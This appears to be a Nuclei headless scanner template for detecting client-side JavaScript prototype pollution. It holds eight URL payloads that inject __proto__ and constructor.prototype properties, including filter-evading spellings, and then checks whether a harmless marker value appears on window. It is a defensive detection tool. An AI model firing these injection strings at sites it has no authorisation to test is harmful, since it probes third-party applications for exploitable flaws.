headless:
- matchers:
  - part: extract1
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?constructor[prototype][vulnerableprop]=polluted#constructor[prototype][vulnerableprop]=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract1
- matchers:
  - part: extract2
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?constructor.prototype.vulnerableprop=polluted#constructor.prototype.vulnerableprop=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract2
- matchers:
  - part: extract3
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?__proto__[vulnerableprop]=polluted#__proto__.vulnerableprop=polluted&__proto__[vulnerableprop]=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract3
- matchers:
  - part: extract4
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?__proto__.vulnerableprop=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract4
- matchers:
  - part: extract5
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?__pro__proto__to__[vulnerableprop]=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract5
- matchers:
  - part: extract6
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?__pro__proto__to__.vulnerableprop=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract6
- matchers:
  - part: extract7
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?constconstructorructor[protoprototypetype][vulnerableprop]=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract7
- matchers:
  - part: extract8
    type: word
    words:
    - polluted
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}?constconstructorructor.protoprototypetype.vulnerableprop=polluted'
  - action: waitload
  - action: script
    args:
      code: "() => {\n return window.vulnerableprop\n}\n"
    name: extract8
id: prototype-pollution-check
info:
  author: pdteam
  metadata:
    max-request: 8
    verified: true
  name: Prototype Pollution Check
  severity: medium
  tags: headless,vuln
